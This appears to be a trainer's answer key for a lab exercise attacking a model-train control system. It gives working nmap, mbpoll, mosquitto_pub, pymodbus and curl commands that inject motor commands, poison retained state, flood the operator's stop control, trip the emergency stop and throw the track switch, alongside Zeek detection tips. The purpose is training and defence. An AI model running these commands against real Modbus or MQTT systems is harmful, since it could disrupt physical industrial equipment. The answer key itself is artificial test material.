# ChooChoo Attacker Solutions (Trainer Reference)

> **Trainer-only.** This is the answer key — the suggested attacker
> progression for both modes with concrete payloads and hostnames. It is
> deliberately *not* shipped inside the attacker container; trainees get
> only the brief tool list in `cheatsheet.md` and have to discover the
> rest from the wire.
>
> Use this to gauge progress, prepare hints, and post-mortem the session.
>
> **Event configuration.** The ChooChoo training event runs the train
> under Modbus and the track switch under MQTT. Suggested progression for
> the event: Section 1 (Recon) → Section 3 (Modbus command injection) →
> Section 6 (Switch throw over MQTT) → Section 4 (Web API) → Section 5
> (Sniffing). Sections 2 (MQTT train command injection) stays in this
> document as a reference for the legacy MQTT surface but is not part of
> the event scenario.

The target services on the Docker network are:

- `web-mqtt` or `web-modbus` — FastAPI HTTP, port 8000
- `mosquitto` — MQTT broker, port 1883 (both train MQTT and the switch)
- `controller` — Modbus outstation, port 5020. Under the event configuration
  it mediates BOTH the train (HR 0/1/2 + coil 0) AND the track switch
  (coils 1/2 + DIs 2/3/4). See M10 for the switch surface.
- `switch-controller-mqtt` — MQTT client that owns the Circuit Cubes
  switch. Not a listening port; discoverable only by seeing it publish
  to `choochoo/switch/+/state` on the broker. Under the event
  configuration the outstation also publishes to the switch's cmd/throw
  topic when its coils are written, so an attacker on `1883/tcp` will see
  the outstation appearing as a legitimate switch client.

Deeper "why each attack works" reference: `VULNERABILITIES.md` (host).

---

## 0. Where am I on the network?

```sh
ip -br a
ip route
```

## 1. Recon

```sh
# Discover live services in the local /24 (the docker network is small)
nmap -sV -p 1-10000 web-mqtt mosquitto controller 2>/dev/null

# In MQTT mode: dump every topic
mosquitto_sub -h mosquitto -t '#' -v &
# (Ctrl+C to stop)

# In Modbus mode: enumerate registers (mbpoll defaults to TCP/502, override
# with -p; reference numbers are 1-based, so `-r 1` reads address 0)
nmap --script modbus-discover -p 5020 controller
mbpoll -m tcp -p 5020 -a 1 -r 1 -c 3 -1 controller            # holding regs
mbpoll -m tcp -p 5020 -a 1 -t 0 -r 1 -c 1 -1 controller       # coils
mbpoll -m tcp -p 5020 -a 1 -t 3 -r 1 -c 2 -1 controller       # input regs (incl. MAX_POWER)
mbpoll -m tcp -p 5020 -a 1 -t 1 -r 1 -c 2 -1 controller       # discrete inputs
```

## 2. Direct command injection (MQTT)

```sh
# Make the train fly
mosquitto_pub -h mosquitto \
  -t choochoo/train/t1/cmd/motor \
  -m '{"action":"motor","direction":"forward","power":99}'

# Stop it
mosquitto_pub -h mosquitto \
  -t choochoo/train/t1/cmd/stop -m '{}'

# Poison the retained state — operator dashboard will lie until it's cleared
mosquitto_pub -h mosquitto -r \
  -t choochoo/train/t1/state \
  -m '{"train_id":"t1","direction":null,"power":0,"connected":false}'

# Throttle flood — drowns out the operator's stop button
while true; do
  mosquitto_pub -h mosquitto \
    -t choochoo/train/t1/cmd/motor \
    -m '{"action":"motor","direction":"forward","power":99}'
done
```

## 3. Direct command injection (Modbus)

```sh
# Power up to 99 (clamped on the device to MAX_POWER, but observable on
# the wire — Zeek's modbus.log will show the raw value the attacker sent).
mbpoll -m tcp -p 5020 -a 1 -t 4:int16 -r 1 controller 99

# Trip emergency stop coil
mbpoll -m tcp -p 5020 -a 1 -t 0 -r 1 controller 1
```

Or scripted:

```sh
python3 - <<'PY'
import asyncio
from pymodbus.client import AsyncModbusTcpClient

async def go():
    c = AsyncModbusTcpClient('controller', port=5020)
    await c.connect()
    await c.write_register(0, 99, slave=1)        # power=99 (signed)
    await c.write_coil(0, True, slave=1)          # E-stop
    c.close()

asyncio.run(go())
PY
```

**The outstation also mediates the track switch (see M10).** Coils 1 and 2
are edge-triggered switch throws — a Modbus master doesn't need to speak
MQTT to divert the train:

```sh
# Read the switch DIs (position + online flag) — DIs 2/3/4, so `-r 3 -c 3`.
mbpoll -m tcp -p 5020 -a 1 -t 0 -r 3 -c 3 controller

# Throw the switch to straight (coil address 1, mbpoll `-r 2`).
mbpoll -m tcp -p 5020 -a 1 -t 0 -r 2 -c 1 controller 1

# Throw the switch to curve (coil address 2, mbpoll `-r 3`).
mbpoll -m tcp -p 5020 -a 1 -t 0 -r 3 -c 1 controller 1
```

The outstation is now an MQTT client itself: coil writes translate into
`ThrowCommand` publishes on the switch broker. A Zeek sensor sniffing
`mqtt_publish.log` sees the outstation as the source, NOT the attacker —
correlate Modbus writes on 5020 with MQTT publishes on 1883 by timestamp.

## 4. The third path: the web API

In both modes the operator's web UI is on `0.0.0.0:8000` with `*` CORS and
no auth. The attacker doesn't need to speak MQTT or Modbus at all.

```sh
curl -sS -X POST http://web-mqtt:8000/api/motor \
  -H 'Content-Type: application/json' \
  -d '{"direction":"forward","power":99}'
```

## 5. Sniff the wire (run on the host's SPAN port in real deployments)

Inside the attacker container the network is virtual, but you can still
see plaintext by tapping the broker / outstation directly:

```sh
tcpdump -i eth0 -A -s0 'port 1883 or port 5020' | head -40
```

For a deeper dissection, copy the pcap to your host and open it in
Wireshark — both MQTT and Modbus have full built-in dissectors.

## 6. Throw the track switch over MQTT (event scenario)

The Circuit Cubes track switch subscribes to `choochoo/switch/+/cmd/throw`
on the same mosquitto broker as the (legacy) train. Anyone who can publish
to that topic moves the switch.

```sh
# Enumerate every switch on the bus. Retained state announces the id.
mosquitto_sub -h mosquitto -t 'choochoo/switch/+/state' -v

# Watch throw events land on the wire — including cooldown_rejected on spam.
mosquitto_sub -h mosquitto -t 'choochoo/switch/+/event' -v &

# Divert the train at will.
mosquitto_pub -h mosquitto \
  -t choochoo/switch/sw1/cmd/throw \
  -m '{"action":"throw","direction":"forward"}'
```

**What the mitigation does and doesn't buy.** The controller enforces a
2 s cooldown per switch, so an attacker cannot burn the motor out by
spamming throws. They *can* still time a throw for the moment the train
is approaching the switch. That distinction — safety vs security — is
the S1 talking point in `VULNERABILITIES.md`.

**Zeek detection**: every throw is a distinct MQTT PUBLISH on
`choochoo/switch/+/cmd/throw`. A source generating more than one throw
per 2 s (against the cooldown floor) is a distinctive signature; that
rate can't be legitimate operator traffic.
